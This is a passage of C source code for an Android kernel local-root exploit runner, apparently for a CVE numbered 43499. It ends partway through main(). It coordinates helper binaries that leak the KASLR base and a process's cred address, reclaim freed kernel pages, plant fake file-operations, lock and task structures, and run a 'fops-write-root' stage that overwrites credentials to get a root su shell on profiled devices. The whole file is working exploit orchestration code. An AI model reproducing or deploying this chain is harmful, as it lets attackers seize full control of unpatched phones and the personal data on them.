// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 yoyicue

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/system_properties.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "profile.h"

#define REMOTE_TARGET  "/data/local/tmp/ionstack_perf_target"
#define REMOTE_PRELOAD "/data/local/tmp/ionstack_preload.so"
#define REMOTE_PROBE   "/data/local/tmp/cve43499_chainwalk_probe_arm32"
#define REMOTE_RUNNER  "/data/local/tmp/ionstack_reroot_device"
#define REMOTE_SU      "/data/local/tmp/su"
#define REMOTE_SOCKET  "/data/local/tmp/temp_su.sock"

#define TRIGGER_APP_PACKAGE "com.ionstack.trigger"
#define TRIGGER_APP_ACTIVITY "com.ionstack.trigger/.MainActivity"

#define HELPER_ATTEMPTS 6
#define HELPER_TIMEOUT_MS 300000U
#define CAPTURE_TIMEOUT_MS 90000U
#define TARGET_READY_TIMEOUT_MS 30000U
#define ROOT_READY_TIMEOUT_MS 30000U
/*
 * Keep this at three. On the supported /260 development unit, the otherwise
 * identical six-worker runner caused substantially more adjust-PI panics.
 * Three workers still cover the write window while reducing contention in
 * the transient fops capture stage.
 */
#define CAPTURE_WORKERS 3U

struct env_pair {
  const char *name;
  const char *value;
};

struct child_proc {
  pid_t pid;
  int fd;
  int exited;
  int status;
  char partial[16384];
  size_t partial_len;
};

struct target_state {
  int ready;
  int root_ready;
  pid_t remote_pid;
  uint64_t kaslr_base;
  uint64_t task;
  uint64_t cred;
  unsigned cred_hits;
  unsigned base_hits;
};

struct helper_state {
  int hold_ready;
  int fresh_ok;
  int order_ok;
  int pfn_ok;
  int content_ok;
  uint64_t hold_base;
  uint64_t fake_lock;
  uint64_t fake_w0;
  uint64_t fake_task;
  uint64_t fake_fops;
  uint64_t binwrite;
  uint64_t fresh_candidate;
  uint64_t target_pfn;
  uint64_t alloc_pfn;
  unsigned fresh_wanted;
  unsigned fresh_matches;
};

struct capture_state {
  int saw_result;
  int ok;
  int su_ready;
  int restore_ok;
};

static volatile sig_atomic_t stop_requested;

static void on_signal(int signo) {
  (void)signo;
  stop_requested = 1;
}

static uint64_t monotonic_ms(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
    return 0;
  }
  return (uint64_t)ts.tv_sec * 1000U + (uint64_t)ts.tv_nsec / 1000000U;
}

static void sleep_ms(unsigned ms) {
  struct timespec delay = {
      .tv_sec = ms / 1000U,
      .tv_nsec = (long)(ms % 1000U) * 1000000L,
  };
  while (nanosleep(&delay, &delay) != 0 && errno == EINTR &&
         !stop_requested) {
  }
}

static int read_first_line(const char *path, char *buffer, size_t size) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  ssize_t got = read(fd, buffer, size - 1);
  int saved_errno = errno;
  close(fd);
  if (got <= 0) {
    errno = saved_errno;
    return -1;
  }
  buffer[got] = '\0';
  char *newline = strpbrk(buffer, "\r\n");
  if (newline) {
    *newline = '\0';
  }
  return 0;
}

static int set_nonblocking(int fd) {
  int flags = fcntl(fd, F_GETFL, 0);
  if (flags < 0) {
    return -1;
  }
  return fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

static void child_init(struct child_proc *child) {
  memset(child, 0, sizeof(*child));
  child->pid = -1;
  child->fd = -1;
}

static int spawn_child(struct child_proc *child, const char *path,
                       char *const argv[], const struct env_pair *environment,
                       size_t environment_count) {
  int pipe_fds[2];
  if (pipe2(pipe_fds, O_CLOEXEC) != 0) {
    return -1;
  }
  pid_t pid = fork();
  if (pid < 0) {
    int saved_errno = errno;
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    errno = saved_errno;
    return -1;
  }
  if (pid == 0) {
    setpgid(0, 0);
    dup2(pipe_fds[1], STDOUT_FILENO);
    dup2(pipe_fds[1], STDERR_FILENO);
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    clearenv();
    setenv("PATH", "/system/bin:/system_ext/bin:/vendor/bin", 1);
    for (size_t i = 0; i < environment_count; ++i) {
      if (setenv(environment[i].name, environment[i].value, 1) != 0) {
        dprintf(STDERR_FILENO, "setenv %s failed: %s\n",
                environment[i].name, strerror(errno));
        _exit(126);
      }
    }
    execv(path, argv);
    dprintf(STDERR_FILENO, "exec %s failed: %s\n", path, strerror(errno));
    _exit(127);
  }

  close(pipe_fds[1]);
  setpgid(pid, pid);
  set_nonblocking(pipe_fds[0]);
  child_init(child);
  child->pid = pid;
  child->fd = pipe_fds[0];
  return 0;
}

static void reap_child(struct child_proc *child) {
  if (child->pid <= 0 || child->exited) {
    return;
  }
  int status = 0;
  pid_t got = waitpid(child->pid, &status, WNOHANG);
  if (got == child->pid) {
    child->exited = 1;
    child->status = status;
  }
}

static int child_exit_code(const struct child_proc *child) {
  if (!child->exited) {
    return -1;
  }
  if (WIFEXITED(child->status)) {
    return WEXITSTATUS(child->status);
  }
  if (WIFSIGNALED(child->status)) {
    return 128 + WTERMSIG(child->status);
  }
  return 255;
}

static void stop_child(struct child_proc *child) {
  if (child->pid > 0 && !child->exited) {
    kill(-child->pid, SIGTERM);
    uint64_t deadline = monotonic_ms() + 2000U;
    while (monotonic_ms() < deadline) {
      reap_child(child);
      if (child->exited) {
        break;
      }
      sleep_ms(25);
    }
    if (!child->exited) {
      kill(-child->pid, SIGKILL);
      while (waitpid(child->pid, &child->status, 0) < 0 && errno == EINTR) {
      }
      child->exited = 1;
    }
  }
  if (child->fd >= 0) {
    close(child->fd);
    child->fd = -1;
  }
}

typedef void (*line_callback)(const char *line, void *opaque);

static void emit_line(struct child_proc *child, const char *line, size_t len,
                      line_callback callback, void *opaque) {
  char local[16384];
  if (len >= sizeof(local)) {
    len = sizeof(local) - 1;
  }
  memcpy(local, line, len);
  local[len] = '\0';
  if (len > 0 && local[len - 1] == '\r') {
    local[len - 1] = '\0';
  }
  printf("%s\n", local);
  if (callback) {
    callback(local, opaque);
  }
  (void)child;
}

static int drain_child(struct child_proc *child, line_callback callback,
                       void *opaque) {
  if (child->fd < 0) {
    return 0;
  }
  char buffer[4096];
  int read_any = 0;
  for (;;) {
    ssize_t got = read(child->fd, buffer, sizeof(buffer));
    if (got > 0) {
      read_any = 1;
      for (ssize_t i = 0; i < got; ++i) {
        char ch = buffer[i];
        if (ch == '\n') {
          emit_line(child, child->partial, child->partial_len, callback,
                    opaque);
          child->partial_len = 0;
        } else if (child->partial_len + 1 < sizeof(child->partial)) {
          child->partial[child->partial_len++] = ch;
        }
      }
      continue;
    }
    if (got == 0) {
      if (child->partial_len > 0) {
        emit_line(child, child->partial, child->partial_len, callback,
                  opaque);
        child->partial_len = 0;
      }
      close(child->fd);
      child->fd = -1;
      break;
    }
    if (errno == EINTR) {
      continue;
    }
    if (errno == EAGAIN || errno == EWOULDBLOCK) {
      break;
    }
    close(child->fd);
    child->fd = -1;
    break;
  }
  reap_child(child);
  return read_any;
}

static int wait_for_child_condition(struct child_proc *child,
                                    unsigned timeout_ms,
                                    line_callback callback, void *opaque,
                                    const int *condition) {
  uint64_t deadline = monotonic_ms() + timeout_ms;
  while (!stop_requested && monotonic_ms() < deadline) {
    if (condition && *condition) {
      return 0;
    }
    struct pollfd pfd = {.fd = child->fd, .events = POLLIN | POLLHUP};
    int poll_rc = child->fd >= 0 ? poll(&pfd, 1, 250) : 0;
    if (poll_rc > 0 || child->fd < 0) {
      drain_child(child, callback, opaque);
    }
    reap_child(child);
    if (child->exited && child->fd < 0) {
      return condition && *condition ? 0 : -1;
    }
  }
  return condition && *condition ? 0 : -1;
}

static int run_capture_command(const char *path, char *const argv[],
                               char *output, size_t output_size,
                               unsigned timeout_ms) {
  struct child_proc child;
  child_init(&child);
  if (spawn_child(&child, path, argv, NULL, 0) != 0) {
    return -1;
  }
  size_t used = 0;
  uint64_t deadline = monotonic_ms() + timeout_ms;
  while (monotonic_ms() < deadline && (!child.exited || child.fd >= 0)) {
    struct pollfd pfd = {.fd = child.fd, .events = POLLIN | POLLHUP};
    if (child.fd >= 0) {
      poll(&pfd, 1, 100);
      char buffer[1024];
      for (;;) {
        ssize_t got = read(child.fd, buffer, sizeof(buffer));
        if (got > 0) {
          size_t copy = (size_t)got;
          if (copy > output_size - 1 - used) {
            copy = output_size - 1 - used;
          }
          if (copy > 0) {
            memcpy(output + used, buffer, copy);
            used += copy;
          }
          continue;
        }
        if (got == 0) {
          close(child.fd);
          child.fd = -1;
        }
        break;
      }
    }
    reap_child(&child);
  }
  output[used] = '\0';
  if (!child.exited) {
    stop_child(&child);
    return -1;
  }
  if (child.fd >= 0) {
    close(child.fd);
  }
  return child_exit_code(&child);
}

static int run_trigger_app_command(char *const argv[], char *output,
                                   size_t output_size,
                                   unsigned timeout_ms) {
  int rc = run_capture_command(argv[0], argv, output, output_size, timeout_ms);
  if (rc != 0 && output[0] != '\0') {
    fprintf(stderr, "[app-probe] command failed rc=%d output=%s", rc, output);
    if (!strchr(output, '\n')) {
      fputc('\n', stderr);
    }
  }
  return rc;
}

static void print_trigger_app_log(void) {
  char output[65536];
  char *argv[] = {"/system/bin/run-as", (char *)TRIGGER_APP_PACKAGE,
                  "/system/bin/cat", "files/probe.log", NULL};
  int rc = run_capture_command(argv[0], argv, output, sizeof(output), 3000);
  if (output[0] != '\0') {
    printf("%s", output);
    if (!strchr(output, '\n') || output[strlen(output) - 1] != '\n') {
      fputc('\n', stdout);
    }
  }
  if (rc != 0) {
    fprintf(stderr, "[app-probe] cannot read probe log rc=%d\n", rc);
  }
}

static void force_stop_trigger_app(void) {
  char output[4096];
  char *argv[] = {"/system/bin/am", "force-stop",
                  (char *)TRIGGER_APP_PACKAGE, NULL};
  run_capture_command(argv[0], argv, output, sizeof(output), 3000);
}

static int launch_trigger_app(const char *tree_arg, const char *task_arg,
                              const char *lock_arg) {
  if (strncmp(tree_arg, "--ashmem-tree-parent=", 21) != 0 ||
      strncmp(task_arg, "--ashmem-task=", 14) != 0 ||
      strncmp(lock_arg, "--ashmem-lock=", 14) != 0) {
    fprintf(stderr, "[app-probe] invalid launcher arguments\n");
    return 2;
  }

  char output[8192];
  force_stop_trigger_app();
  char *remove_argv[] = {
      "/system/bin/run-as", (char *)TRIGGER_APP_PACKAGE, "/system/bin/rm",
      "-f", "files/probe.log", "files/probe.done", NULL,
  };
  if (run_trigger_app_command(remove_argv, output, sizeof(output), 3000) != 0) {
    return 125;
  }

  char *start_argv[] = {
      "/system/bin/am", "start", "-W", "-n", (char *)TRIGGER_APP_ACTIVITY,
      "--es", "tree_arg", (char *)tree_arg,
      "--es", "task_arg", (char *)task_arg,
      "--es", "lock_arg", (char *)lock_arg,
      NULL,
  };
  if (run_trigger_app_command(start_argv, output, sizeof(output), 10000) != 0) {
    force_stop_trigger_app();
    return 125;
  }
  printf("[app-probe] activity started tree=%s task=%s lock=%s\n",
         tree_arg, task_arg, lock_arg);

  uint64_t deadline = monotonic_ms() + 30000U;
  while (!stop_requested && monotonic_ms() < deadline) {
    char done[128];
    char *done_argv[] = {"/system/bin/run-as", (char *)TRIGGER_APP_PACKAGE,
                         "/system/bin/cat", "files/probe.done", NULL};
    int rc = run_capture_command(done_argv[0], done_argv, done, sizeof(done),
                                 1000);
    if (rc == 0) {
      char *end = NULL;
      errno = 0;
      long probe_rc = strtol(done, &end, 10);
      if (errno == 0 && end != done && probe_rc >= 0 && probe_rc <= 255) {
        print_trigger_app_log();
        force_stop_trigger_app();
        printf("[app-probe] completed rc=%ld\n", probe_rc);
        return (int)probe_rc;
      }
    }
    sleep_ms(100);
  }

  print_trigger_app_log();
  force_stop_trigger_app();
  fprintf(stderr, "[app-probe] timed out waiting for result\n");
  return 124;
}

static int existing_root_works(void) {
  if (access(REMOTE_SU, X_OK) != 0) {
    return 0;
  }
  char *argv[] = {(char *)REMOTE_SU, "-c", "id", NULL};
  char output[4096];
  int rc = run_capture_command(REMOTE_SU, argv, output, sizeof(output), 5000);
  if (rc == 0 && strstr(output, "uid=0(root)")) {
    printf("[reroot] existing root verified: %s", output);
    if (!strchr(output, '\n')) {
      printf("\n");
    }
    return 1;
  }
  return 0;
}

static void target_line(const char *line, void *opaque) {
  struct target_state *state = opaque;
  const char *ready = strstr(line, "[perf-target] READY ");
  if (ready) {
    int pid = 0;
    uint64_t base = 0;
    uint64_t task = 0;
    uint64_t cred = 0;
    unsigned task_hits = 0;
    unsigned cred_hits = 0;
    unsigned base_hits = 0;
    size_t samples = 0;
    int fields = sscanf(
        ready,
        "[perf-target] READY pid=%d kaslr_base=0x%" SCNx64
        " task=0x%" SCNx64 " task_hits=%u cred=0x%" SCNx64
        " cred_hits=%u base_hits=%u samples=%zu",
        &pid, &base, &task, &task_hits, &cred, &cred_hits, &base_hits,
        &samples);
    if (fields == 8 && pid > 0 && base != 0 && cred != 0 && cred_hits >= 2) {
      state->ready = 1;
      state->remote_pid = pid;
      state->kaslr_base = base;
      state->task = task;
      state->cred = cred;
      state->cred_hits = cred_hits;
      state->base_hits = base_hits;
    }
  }
  if (strstr(line, "[perf-target] ROOT_READY ")) {
    state->root_ready = 1;
  }
}

static int line_value_is_one(const char *line, const char *key) {
  const char *where = strstr(line, key);
  if (!where) {
    return 0;
  }
  where += strlen(key);
  return *where == '1' && (where[1] == '\0' || where[1] == ' ');
}

static void helper_line(const char *line, void *opaque) {
  struct helper_state *state = opaque;
  const char *fresh = strstr(line, "ks prepare-fresh-set validation ");
  if (fresh) {
    int ok = 0;
    uint64_t candidate = 0;
    unsigned wanted = 0;
    unsigned matches = 0;
    int fields = sscanf(fresh,
                        "ks prepare-fresh-set validation ok=%d candidate=%"
                        SCNx64 " wanted=%u matches=%u",
                        &ok, &candidate, &wanted, &matches);
    if (fields == 4) {
      state->fresh_ok = ok == 1 && wanted > 0 && matches >= wanted;
      state->fresh_candidate = candidate;
      state->fresh_wanted = wanted;
      state->fresh_matches = matches;
    }
  }

  const char *order = strstr(line, "reclaim-order-gate sends=");
  if (order) {
    unsigned sends = 0;
    unsigned success = 0;
    unsigned fail = 0;
    int accepted = 0;
    if (sscanf(order,
               "reclaim-order-gate sends=%u order3_success=%u "
               "order3_fail=%u accepted=%d",
               &sends, &success, &fail, &accepted) == 4) {
      /*
       * The tracepoint counter also observes order-3 allocations performed by
       * this holder outside the send loop.  The payload's own gate is the
       * authoritative invariant: at least one successful allocation, no
       * failed order-3 allocation, and an accepted reclaim result.  Requiring
       * success == sends rejects exact-PFN/content-validated holders whenever
       * those auxiliary allocations are present.
       */
      state->order_ok = accepted == 1 && sends > 0 && success > 0 &&
                        fail == 0;
    }
  }

  const char *pfn = strstr(line, "reclaim-pfn-result ");
  if (pfn) {
    unsigned candidates = 0;
    unsigned free_hits = 0;
    unsigned alloc_hits = 0;
    unsigned matched_hits = 0;
    uint64_t target = 0;
    uint64_t alloc = 0;
    int matched = 0;
    if (sscanf(pfn,
               "reclaim-pfn-result candidates=%u free_hits=%u alloc_hits=%u "
               "matched_hits=%u target_pfn=%" SCNx64
               " alloc_pfn=%" SCNx64 " matched=%d",
               &candidates, &free_hits, &alloc_hits, &matched_hits, &target,
               &alloc, &matched) == 7) {
      state->pfn_ok = matched == 1 && candidates > 0 && free_hits > 0 &&
                      alloc_hits > 0 && matched_hits > 0 && target == alloc;
      state->target_pfn = target;
      state->alloc_pfn = alloc;
    }
  }

  const char *content = strstr(line, "reclaim-content-validate ");
  if (content && line_value_is_one(content, "ok=")) {
    state->content_ok = 1;
  }

  const char *hold = strstr(line, "stage fops-page-hold hold-ready ");
  if (hold) {
    uint64_t base = 0;
    uint64_t fake_lock = 0;
    uint64_t fake_w0 = 0;
    uint64_t fake_task = 0;
    uint64_t fake_fops = 0;
    uint64_t binwrite = 0;
    int fields = sscanf(
        hold,
        "stage fops-page-hold hold-ready base=%" SCNx64
        " fake_lock=%" SCNx64 " fake_w0=%" SCNx64
        " fake_task=%" SCNx64 " fake_fops=%" SCNx64
        " binwrite=%" SCNx64,
        &base, &fake_lock, &fake_w0, &fake_task, &fake_fops, &binwrite);
    if (fields == 6 && base && fake_lock && fake_w0 && fake_task &&
        fake_fops && binwrite) {
      state->hold_base = base;
      state->fake_lock = fake_lock;
      state->fake_w0 = fake_w0;
      state->fake_task = fake_task;
      state->fake_fops = fake_fops;
      state->binwrite = binwrite;
      state->hold_ready = 1;
    }
  }
}

static void capture_line(const char *line, void *opaque) {
  struct capture_state *state = opaque;
  const char *result = strstr(line, "stage-fops-write-root-result ");
  if (result) {
    state->saw_result = 1;
    state->ok = line_value_is_one(result, "ok=");
    state->su_ready = line_value_is_one(result, "su_ready=");
    const char *restore = strstr(result, " restore=");
    if (restore) {
      unsigned long value = strtoul(restore + strlen(" restore="), NULL, 0);
      state->restore_ok = value == 8;
    }
    return;
  }

  result = strstr(line, "stage-fops-check-result ");
  if (!result) {
    return;
  }
  state->saw_result = 1;
  state->ok = line_value_is_one(result, "ok=");
  const char *restore = strstr(result, " restore_ret=");
  if (restore) {
    long value = strtol(restore + strlen(" restore_ret="), NULL, 0);
    state->restore_ok = value == 8;
  }
}

static int spawn_target(struct child_proc *child, unsigned hold_sec) {
  char hold_arg[64];
  snprintf(hold_arg, sizeof(hold_arg), "--hold-sec=%u", hold_sec);
  char *argv[] = {(char *)REMOTE_TARGET, "--sample-ms=2500", "--freq=4000",
                  "--attempts=8", hold_arg, NULL};
  return spawn_child(child, REMOTE_TARGET, argv, NULL, 0);
}

static int spawn_holder(struct child_proc *child, uint64_t kaslr_base,
                        unsigned hold_sec, unsigned attempt) {
  char base_value[32];
  char hold_value[32];
  char partial_slabs_value[32];
  char posttarget_sends_value[32];
  snprintf(base_value, sizeof(base_value), "0x%016" PRIx64, kaslr_base);
  snprintf(hold_value, sizeof(hold_value), "%u", hold_sec);
#if defined(IONSTACK_PROFILE_XPAD3S)
  snprintf(partial_slabs_value, sizeof(partial_slabs_value), "%u",
           8U + (attempt > 1 ? (attempt - 1U) * 2U : 0U));
#else
  snprintf(partial_slabs_value, sizeof(partial_slabs_value), "%u",
           18U + (attempt > 1 ? (attempt - 1U) * 2U : 0U));
#endif
  snprintf(posttarget_sends_value, sizeof(posttarget_sends_value), "%u",
           8192U + (attempt > 1 ? (attempt - 1U) * 1024U : 0U));
  struct env_pair environment[] = {
      {"IONSTACK_KASLR_BASE", base_value},
      {"IONSTACK_KS_COLLISIONS", "8"},
      {"IONSTACK_KS_THREADS", "8"},
#if defined(IONSTACK_PROFILE_XPAD3S)
      {"IONSTACK_RECLAIM_PREPARE_SLABS", "12"},
#endif
      {"IONSTACK_RECLAIM_CORE", "1"},
      {"IONSTACK_RECLAIM_PARTIAL_SLABS", partial_slabs_value},
      {"IONSTACK_RECLAIM_SPLICE_ORDER_GATE", "1"},
      {"IONSTACK_RECLAIM_REQUIRE_ORDER3", "1"},
      {"IONSTACK_RECLAIM_PFN_IDENTITY", "1"},
#if defined(IONSTACK_PROFILE_XPAD3S)
      {"IONSTACK_RECLAIM_PHYS_PFN_END", "0x240000"},
#endif
      {"IONSTACK_RECLAIM_RELEASE_PREPARE_EARLY", "1"},
      {"IONSTACK_RECLAIM_TARGET_LAST", "1"},
      {"IONSTACK_RECLAIM_PRETARGET_SENDS", "0"},
      {"IONSTACK_RECLAIM_PRETARGET_HOLD", "1"},
      {"IONSTACK_RECLAIM_PRETARGET_LATE", "1"},
      {"IONSTACK_RECLAIM_POSTTARGET_SEARCH", "1"},
      {"IONSTACK_RECLAIM_POSTTARGET_SENDS", posttarget_sends_value},
      {"IONSTACK_RECLAIM_POSTTARGET_MAX_SOCKETS", "32"},
      {"IONSTACK_RECLAIM_VALIDATE_CONTENT", "1"},
      {"IONSTACK_RECLAIM_REQUIRE_CONTENT", "1"},
      {"IONSTACK_STAGE", "fops-page-hold"},
      {"IONSTACK_PAGE_HOLD_SEC", hold_value},
      {"IONSTACK_FOPS_PI_WAITERS", "0"},
      {"IONSTACK_FOPS_PI_LEFTMOST", "1"},
      {"IONSTACK_FOPS_PI_NODE_SAFE", "0"},
      {"IONSTACK_FOPS_PI_RB_SHAPE", "default"},
      {"IONSTACK_FOPS_LOCK_OWNER_MODE", "fake-task"},
      {"IONSTACK_FOPS_LOCK_WAITERS", "1"},
      {"IONSTACK_FOPS_WAIT_LOCK_WORD", "0"},
      {"LD_PRELOAD", REMOTE_PRELOAD},
  };
  char *argv[] = {"/system/bin/toybox", "true", NULL};
  return spawn_child(child, argv[0], argv, environment,
                     sizeof(environment) / sizeof(environment[0]));
}

static int spawn_capture(struct child_proc *child, unsigned worker,
                         const struct target_state *target,
                         const struct helper_state *helper,
                         uint64_t linear_map_base, int check_only) {
  char kaslr_value[32];
  char cred_value[32];
  char fops_value[32];
  char linear_value[32];
  snprintf(kaslr_value, sizeof(kaslr_value), "0x%016" PRIx64,
           target->kaslr_base);
  snprintf(cred_value, sizeof(cred_value), "0x%016" PRIx64, target->cred);
  snprintf(fops_value, sizeof(fops_value), "0x%016" PRIx64,
           helper->fake_fops);
  snprintf(linear_value, sizeof(linear_value), "0x%016" PRIx64,
           linear_map_base);
  struct env_pair root_environment[] = {
      {"IONSTACK_STAGE", "fops-write-root"},
      {"IONSTACK_EXPECT_FAKE_FOPS", fops_value},
      {"IONSTACK_FOPS_ROOT_ROUTE", "cred-writeonly"},
      {"IONSTACK_TARGET_CRED", cred_value},
      {"IONSTACK_FOPS_ROOT_ATTEMPTS", "10000000"},
      {"IONSTACK_FOPS_ROOT_RETRY_US", "0"},
      {"IONSTACK_FOPS_ROOT_CLEANUP_DELAY_MS", "6500"},
      {"IONSTACK_LINEAR_MAP_BASE", linear_value},
      {"IONSTACK_KASLR_BASE", kaslr_value},
      {"LD_PRELOAD", REMOTE_PRELOAD},
  };
  struct env_pair check_environment[] = {
      {"IONSTACK_STAGE", "fops-check"},
      {"IONSTACK_EXPECT_FAKE_FOPS", fops_value},
      {"IONSTACK_FOPS_CHECK_ATTEMPTS", "10000000"},
      {"IONSTACK_FOPS_CHECK_RETRY_US", "0"},
      {"IONSTACK_FOPS_CHECK_RESTORE", "1"},
      {"IONSTACK_LINEAR_MAP_BASE", linear_value},
      {"IONSTACK_KASLR_BASE", kaslr_value},
      {"LD_PRELOAD", REMOTE_PRELOAD},
  };
  char *argv[] = {"/system/bin/toybox", "true", NULL};
  const struct env_pair *environment =
      check_only ? check_environment : root_environment;
  size_t environment_count =
      check_only ? sizeof(check_environment) / sizeof(check_environment[0])
                 : sizeof(root_environment) / sizeof(root_environment[0]);
  int rc = spawn_child(child, argv[0], argv, environment,
                       environment_count);
  if (rc == 0) {
    static const int cpus[CAPTURE_WORKERS] = {0, 3, 6};
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpus[worker % CAPTURE_WORKERS], &set);
    if (sched_setaffinity(child->pid, sizeof(set), &set) != 0) {
      fprintf(stderr,
              "[reroot] capture affinity warning worker=%u pid=%d errno=%d\n",
              worker, child->pid, errno);
    }
  }
  return rc;
}

static int spawn_probe(struct child_proc *child,
                       const struct target_state *target,
                       const struct helper_state *helper) {
#if defined(IONSTACK_PROFILE_XPAD3S)
  char tree_arg[64];
  char task_arg[64];
  char lock_arg[64];
  uint64_t init_task = target->kaslr_base + IONSTACK_INIT_TASK_OFF;
  snprintf(tree_arg, sizeof(tree_arg),
           "--ashmem-tree-parent=0x%016" PRIx64, helper->fake_w0);
  snprintf(task_arg, sizeof(task_arg), "--ashmem-task=0x%016" PRIx64,
           init_task);
  snprintf(lock_arg, sizeof(lock_arg), "--ashmem-lock=0x%016" PRIx64,
           helper->fake_lock);
  char *argv[] = {(char *)REMOTE_RUNNER, "--app-probe-launch", tree_arg,
                  task_arg, lock_arg, NULL};
#else
  (void)target;
  char task_arg[64];
  char lock_arg[64];
  snprintf(task_arg, sizeof(task_arg), "--io-submit-task=0x%016" PRIx64,
           helper->fake_task);
  snprintf(lock_arg, sizeof(lock_arg), "--io-submit-lock=0x%016" PRIx64,
           helper->fake_lock);
  char *argv[] = {
      (char *)REMOTE_PROBE,
      "--stage-edeadlk-idle",
      "--i-understand-this-may-panic",
      "--waiter-post-return=pipe-read-io-submit",
      task_arg,
      lock_arg,
      "--watchdog-sec=20",
      "--hold-ms=5000",
      "--io-submit-opcode=200",
      "--waiter-adjust-pi-after-post-return",
      "--adjust-pi-repeats=1",
      "--waiter-isolated-hold=getuidloop",
      "--adjust-pi-start-isolated-hold",
      "--idle-ms=100",
      NULL,
  };
#endif
#if defined(IONSTACK_PROFILE_XPAD3S)
  return spawn_child(child, REMOTE_RUNNER, argv, NULL, 0);
#else
  return spawn_child(child, REMOTE_PROBE, argv, NULL, 0);
#endif
}

static int wait_captures_and_probe(struct child_proc *captures,
                                   struct capture_state *capture_states,
                                   size_t capture_count,
                                   struct child_proc *probe) {
  uint64_t deadline = monotonic_ms() + CAPTURE_TIMEOUT_MS;
  while (!stop_requested && monotonic_ms() < deadline) {
    struct pollfd pollfds[CAPTURE_WORKERS + 1];
    nfds_t count = 0;
    for (size_t i = 0; i < capture_count; ++i) {
      if (captures[i].fd >= 0) {
        pollfds[count++] = (struct pollfd){.fd = captures[i].fd,
                                           .events = POLLIN | POLLHUP};
      }
    }
    if (probe->fd >= 0) {
      pollfds[count++] =
          (struct pollfd){.fd = probe->fd, .events = POLLIN | POLLHUP};
    }
    if (count > 0) {
      poll(pollfds, count, 250);
    } else {
      sleep_ms(25);
    }
    int any_success = 0;
    int all_captures_exited = 1;
    for (size_t i = 0; i < capture_count; ++i) {
      drain_child(&captures[i], capture_line, &capture_states[i]);
      reap_child(&captures[i]);
      if (!captures[i].exited || captures[i].fd >= 0) {
        all_captures_exited = 0;
      }
      if (capture_states[i].saw_result && capture_states[i].ok &&
          capture_states[i].restore_ok) {
        any_success = 1;
      }
    }
    drain_child(probe, NULL, NULL);
    reap_child(probe);
    if (any_success && probe->exited && probe->fd < 0) {
      return 0;
    }
    if (all_captures_exited && probe->exited && probe->fd < 0) {
      return 0;
    }
  }
  return -1;
}

static int all_required_files_present(void) {
  const char *paths[] = {REMOTE_TARGET, REMOTE_PRELOAD, REMOTE_PROBE};
  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); ++i) {
    struct stat st;
    if (stat(paths[i], &st) != 0 || !S_ISREG(st.st_mode)) {
      fprintf(stderr, "[reroot] missing artifact %s\n", paths[i]);
      return 0;
    }
  }
  if (access(REMOTE_TARGET, X_OK) != 0 || access(REMOTE_PROBE, X_OK) != 0) {
    fprintf(stderr, "[reroot] target/probe is not executable\n");
    return 0;
  }
  return 1;
}

static int target_profile_matches(void) {
  struct utsname uts;
  if (uname(&uts) != 0) {
    perror("[reroot] uname");
    return 0;
  }
  char device[PROP_VALUE_MAX] = {0};
  char sdk[PROP_VALUE_MAX] = {0};
  char fingerprint[PROP_VALUE_MAX] = {0};
  __system_property_get("ro.product.device", device);
  __system_property_get("ro.build.version.sdk", sdk);
  __system_property_get("ro.build.fingerprint", fingerprint);
  int release_ok =
      strncmp(uts.release, EXPECTED_KERNEL_RELEASE,
              strlen(EXPECTED_KERNEL_RELEASE)) == 0;
  int device_ok = strcmp(device, EXPECTED_DEVICE) == 0;
  int sdk_ok = strcmp(sdk, EXPECTED_SDK) == 0;
  int version_ok = strcmp(uts.version, EXPECTED_KERNEL_VERSION) == 0;
  int fingerprint_ok = strcmp(fingerprint, EXPECTED_FINGERPRINT) == 0 ||
      (EXPECTED_FINGERPRINT_ALT[0] != '\0' &&
       strcmp(fingerprint, EXPECTED_FINGERPRINT_ALT) == 0);
  printf("[reroot] PROFILE name=%s machine=%s release=%s device=%s sdk=%s "
         "release_ok=%d version_ok=%d device_ok=%d sdk_ok=%d "
         "fingerprint_ok=%d\n",
         IONSTACK_PROFILE_NAME, uts.machine, uts.release, device, sdk,
         release_ok, version_ok,
         device_ok, sdk_ok, fingerprint_ok);
  return strcmp(uts.machine, "aarch64") == 0 && release_ok && device_ok &&
         sdk_ok && version_ok && fingerprint_ok;
}

int main(int argc, char **argv) {
  if (argc == 5 && strcmp(argv[1], "--app-probe-launch") == 0) {
    setvbuf(stdout, NULL, _IOLBF, 0);
    setvbuf(stderr, NULL, _IOLBF, 0);
    signal(SIGINT, on_signal);
    signal(SIGTERM, on_signal);
    signal(SIGHUP, on_signal);
    return launch_trigger_app(argv[2], argv[3], argv[4]);
  }

  unsigned target_hold_sec = 900;
  unsigned page_hold_sec = 240;
  int force = 0;
  int validate_only = 0;
  int chain_validate_only = 0;
  int preflight_only = 0;
  for (int i = 1; i < argc; ++i) {
    if (strcmp(argv[i], "--force") == 0) {
      force = 1;
    } else if (strcmp(argv[i], "--validate-only") == 0) {
      validate_only = 1;
    } else if (strcmp(argv[i], "--chain-validate-only") == 0) {
      chain_validate_only = 1;
    } else if (strcmp(argv[i], "--preflight-only") == 0) {
      preflight_only = 1;
    } else if (strncmp(argv[i], "--target-hold-sec=", 18) == 0) {
      target_hold_sec = (unsigned)strtoul(argv[i] + 18, NULL, 0);
    } else if (strncmp(argv[i], "--page-hold-sec=", 16) == 0) {
      page_hold_sec = (unsigned)strtoul(argv[i] + 16, NULL, 0);
    } else if (strcmp(argv[i], "--help") == 0) {
      printf("usage: %s [--force] [--preflight-only] [--validate-only] "
             "[--chain-validate-only] "
             "[--target-hold-sec=N] "
             "[--page-hold-sec=N]\n",
             argv[0]);
      return 0;
    } else {
      fprintf(stderr, "unknown argument: %s\n", argv[i]);
      return 2;
    }
  }
  if (target_hold_sec < 60 || page_hold_sec < 60) {
